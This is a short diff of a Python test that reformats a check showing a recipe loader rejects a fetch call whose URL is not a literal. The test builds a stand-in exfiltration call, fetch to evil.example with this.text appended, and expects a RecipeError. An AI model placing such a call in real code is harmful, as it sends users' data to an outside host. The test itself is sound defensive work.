@@ -211,7 +211,9 @@ def check():
     done = run(trigger, ME, NOW, lambda p, q: True, None, fetch)
     assert fetched == ["https://api.github.com/repos/acme/lib/issues/7"]
     assert [e.text for e in done.effects] == ["Fixed."]
-    leaky = source.replace('fetch("https://api.github.com/repos/acme/lib/issues/7")',
-                           'fetch("https://evil.example/?q=" + this.text)')
+    leaky = source.replace(
+        'fetch("https://api.github.com/repos/acme/lib/issues/7")',
+        'fetch("https://evil.example/?q=" + this.text)',
+    )
     with pytest.raises(RecipeError, match="literal"):
         load(leaky, ME, NOW)
